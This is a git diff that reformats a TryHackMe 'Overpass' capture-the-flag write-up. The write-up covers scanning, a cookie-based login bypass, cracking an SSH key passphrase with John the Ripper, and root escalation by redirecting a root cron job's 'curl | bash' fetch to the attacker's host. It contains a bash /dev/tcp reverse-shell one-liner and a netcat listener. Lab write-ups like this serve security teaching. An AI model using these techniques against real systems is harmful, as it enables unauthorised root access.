@@ -1,9 +1,13 @@
-## Overpass
+# Overpass
+
+### Overpass
 
 Room link: https://tryhackme.com/room/overpass
 
-## Scanning 
-I ran an nmap aggressive scan on the box using ```nmap -A [Remote IP]```.
+### Scanning
+
+I ran an nmap aggressive scan on the box using `nmap -A [Remote IP]`.
+
 ```
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
@@ -18,7 +22,9 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 18.61 seconds
 ```
-Just to cover all my bases, I also ran a full port scan on the box to see if there were any random open ports using ```nmap -p- [Remote IP]```.
+
+Just to cover all my bases, I also ran a full port scan on the box to see if there were any random open ports using `nmap -p- [Remote IP]`.
+
 ```
 PORT   STATE SERVICE
 22/tcp open  ssh
@@ -26,11 +32,15 @@ PORT   STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 47.09 seconds
 ```
+
 So, it appears that we are only working with ssh and http for services.
-## Enumeration
-Let's use Nikto and gobuster to enumerate the website. I like using Nikto with the ``-h`` option and gobuster with the ```directory-list-1.0.txt``` file produced by SecLists (https://github.com/danielmiessler/SecLists). Depending on your computing capability, it may take a while to complete directory enumeration 
+
+### Enumeration
+
+Let's use Nikto and gobuster to enumerate the website. I like using Nikto with the `-h` option and gobuster with the `directory-list-1.0.txt` file produced by SecLists (https://github.com/danielmiessler/SecLists). Depending on your computing capability, it may take a while to complete directory enumeration
 
 The output of Nikto shows interesting locations like /admin, /downloads, and /img.
+
 ```
 ---------------------------------------------------------------------------
 + Server: No banner retrieved
@@ -46,9 +56,10 @@ The output of Nikto shows interesting locations like /admin, /downloads, and /im
 + End Time:           2022-02-17 18:52:51 (GMT-5) (596 seconds)
 ---------------------------------------------------------------------------
 + 1 host(s) tested
-
 ```
-Gobuster produced some of the same information. 
+
+Gobuster produced some of the same information.
+
 ```
 =====================================================
 /downloads (Status: 301)
@@ -62,8 +73,11 @@ Gobuster produced some of the same information.
 2022/02/17 19:09:32 Finished
 =====================================================
 ```
-## Initial Access 
-The /admin page asks for a username and password. Using the Network section in Developer Tools on the browser, I can see that when the login button is pressed a login.js script runs. I took a look at the login.js file. 
+
+### Initial Access
+
+The /admin page asks for a username and password. Using the Network section in Developer Tools on the browser, I can see that when the login button is pressed a login.js script runs. I took a look at the login.js file.
+
 ```
 async function postData(url = '', data = {}) {
     // Default options are marked with *
@@ -109,13 +123,19 @@ async function login() {
     }
 }
 ```
-The most important section is the ```login()``` function, specifically the ```Cookies.set("SessionToken",statusOrCookie)```. With this information, I can set the Cookie to be blank, which bypasses the if statement (```if (statusOrCookie === "Incorrect credentials")```) and authenticates. I will set the Cookie in the Developer Tools console with: 
+
+The most important section is the `login()` function, specifically the `Cookies.set("SessionToken",statusOrCookie)`. With this information, I can set the Cookie to be blank, which bypasses the if statement (`if (statusOrCookie === "Incorrect credentials")`) and authenticates. I will set the Cookie in the Developer Tools console with:
+
 ```
 Cookies.set("SessionToken","")
 ```
-After setting the Cookie, I simply reload the /admin page and I will authenticate and login. 
-## Exploitation 
-After authenticating, I am presented with an RSA private key on the /admin page: 
+
+After setting the Cookie, I simply reload the /admin page and I will authenticate and login.
+
+### Exploitation
+
+After authenticating, I am presented with an RSA private key on the /admin page:
+
 ```
 -----BEGIN RSA PRIVATE KEY-----
 Proc-Type: 4,ENCRYPTED
@@ -148,19 +168,27 @@ ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
 2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
 -----END RSA PRIVATE KEY-----
 ```
-I attempted to authenticate with the rsa private key (make sure to set the correct permissions with ```chmod 400 ssh_james```) as ```ssh -i ssh_james james@[THM IP]```. However, it requested a passphrase: 
+
+I attempted to authenticate with the rsa private key (make sure to set the correct permissions with `chmod 400 ssh_james`) as `ssh -i ssh_james james@[THM IP]`. However, it requested a passphrase:
+
 ```
 Enter passphrase for key 'ssh_james': 
 ```
-Therefore, I needed to use John the Ripper to crack the passphrase for me. ssh2john is a great python script within john that helps me to format the private key for use with john. 
+
+Therefore, I needed to use John the Ripper to crack the passphrase for me. ssh2john is a great python script within john that helps me to format the private key for use with john.
+
 ```
 ./ssh2john.py ~/TryHackMe/practice/ssh_james > /home/ajread/TryHackMe/practice/ssh_james_hash.txt
 ```
-Now that it is properly formatted, I can attempt to crack the passphrase with John the Ripper. I used rockyou as the wordlist. 
+
+Now that it is properly formatted, I can attempt to crack the passphrase with John the Ripper. I used rockyou as the wordlist.
+
 ```
 ./john --wordlist=/home/ajread/resources/wordlists/rockyou.txt /home/ajread/TryHackMe/practice/ssh_james_hash.txt
 ```
-The passphrase returned: 
+
+The passphrase returned:
+
 ```
 Using default input encoding: UTF-8
 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
@@ -172,15 +200,19 @@ Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
 1g 0:00:00:00 DONE (2022-02-17 20:32) 25.00g/s 334400p/s 334400c/s 334400C/s 100588..handball
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
-
 ```
-With the passphrase, I am able to login as user james and find flag at user.txt.  
+
+With the passphrase, I am able to login as user james and find flag at user.txt.
+
 ```
 james@overpass-prod:~$ id
 uid=1001(james) gid=1001(james) groups=1001(james)
 ```
-## Privilege Escalation 
-After logging in as james, there is a txt file with a possible hint for privilege escalation: 
+
+### Privilege Escalation
+
+After logging in as james, there is a txt file with a possible hint for privilege escalation:
+
 ```
 To Do:
 > Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
@@ -190,7 +222,9 @@ To Do:
 > Ask Paradox how he got the automated build script working and where the builds go.
   They're not updating on the website
 ```
+
 The note gave hints to a possible "automated build script" which makes me think about crontab. Looking at /etc/crontab:
+
 ```
 # /etc/crontab: system-wide crontab
 # Unlike any other crontab you don't have to run the `crontab'
@@ -209,7 +243,8 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 # Update builds from latest code
 * * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
 ```
-The last line (```* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash```) looks interesting and should be investigated since it is run by root. To check out the build script, I used curl to grab it from http://[RemoteIP]/downloads/src/buildscript.sh. 
+
+The last line (`* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash`) looks interesting and should be investigated since it is run by root. To check out the build script, I used curl to grab it from http://\[RemoteIP]/downloads/src/buildscript.sh.
 
 ```
 GOOS=linux /usr/local/go/bin/go build -o ~/builds/overpassLinux ~/src/overpass.go
@@ -219,11 +254,15 @@ GOOS=linux /usr/local/go/bin/go build -o ~/builds/overpassLinux ~/src/overpass.g
 ## GOOS=openbsd /usr/local/go/bin/go build -o ~/builds/overpassOpenBSD ~/src/overpass.go
 echo "$(date -R) Builds completed" >> /root/buildStatus
 ```
-Basically, the job runs and updates builds from latest code using go. If I can change the buildscript to execute a reverse shell, it will be executed by root and I will have escalated privileges. In order to do so, I noticed the ```overpass.thm``` in crontab, meaning it references the ```/etc/hosts``` file to obtain the correct IP address. Therefore, if I can change the ```/etc/hosts``` file to point at my remote machine when it calls the buildscript, the job will call my attack box IP address and run the buildscript on my machine. To ensure I can update ```/etc/hosts``` file I checked the permissions. 
+
+Basically, the job runs and updates builds from latest code using go. If I can change the buildscript to execute a reverse shell, it will be executed by root and I will have escalated privileges. In order to do so, I noticed the `overpass.thm` in crontab, meaning it references the `/etc/hosts` file to obtain the correct IP address. Therefore, if I can change the `/etc/hosts` file to point at my remote machine when it calls the buildscript, the job will call my attack box IP address and run the buildscript on my machine. To ensure I can update `/etc/hosts` file I checked the permissions.
+
 ```
 -rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts
 ```
-Right now, the ```/etc/hosts``` file looks like the below. 
+
+Right now, the `/etc/hosts` file looks like the below.
+
 ```
 127.0.0.1 localhost
 127.0.1.1 overpass-prod
@@ -235,7 +274,9 @@ ff00::0 ip6-mcastprefix
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 ```
-It needs to be changed to reflect my local/attack box IP. 
+
+It needs to be changed to reflect my local/attack box IP.
+
 ```
 127.0.0.1 localhost
 127.0.1.1 overpass-prod
@@ -247,30 +288,38 @@ ff00::0 ip6-mcastprefix
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 ```
-Let me create a reverse shell in bash and place it within my local machine at ```/downloads/src/buildscript.sh```. 
+
+Let me create a reverse shell in bash and place it within my local machine at `/downloads/src/buildscript.sh`.
+
 ```
 echo "bash -i >& /dev/tcp/[Local IP]/5555 0>&1" > buildscript.sh
 ```
-After creating the buildscript, I need to start up a python3 http server on port 80 in the parent directory of ```/downloads/src/buildscript.sh```for the remote machine to call with the crontab. 
+
+After creating the buildscript, I need to start up a python3 http server on port 80 in the parent directory of `/downloads/src/buildscript.sh`for the remote machine to call with the crontab.
+
 ```
 sudo python3 -m http.server 80
 ```
-Now, in a different terminal, I start a netcat listener on port 5555 to receive the reverse shell. 
+
+Now, in a different terminal, I start a netcat listener on port 5555 to receive the reverse shell.
+
 ```
 nc -lnvp 5555
 ```
-After a certain period of time, the job calls the build script, creates a reverse shell and escalates privilege! 
 
-I can see the HTTP GET request by the Overpass machine to my local machine. 
+After a certain period of time, the job calls the build script, creates a reverse shell and escalates privilege!
+
+I can see the HTTP GET request by the Overpass machine to my local machine.
+
 ```
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.118.191 - - [18/Feb/2022 08:00:01] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
 ```
-In the terminal where my netcat listener is set up, I am dropped into a root shell. 
+
+In the terminal where my netcat listener is set up, I am dropped into a root shell.
+
 ```
 root@overpass-prod:~# id
 id
 uid=0(root) gid=0(root) groups=0(root)
 ```
-
-
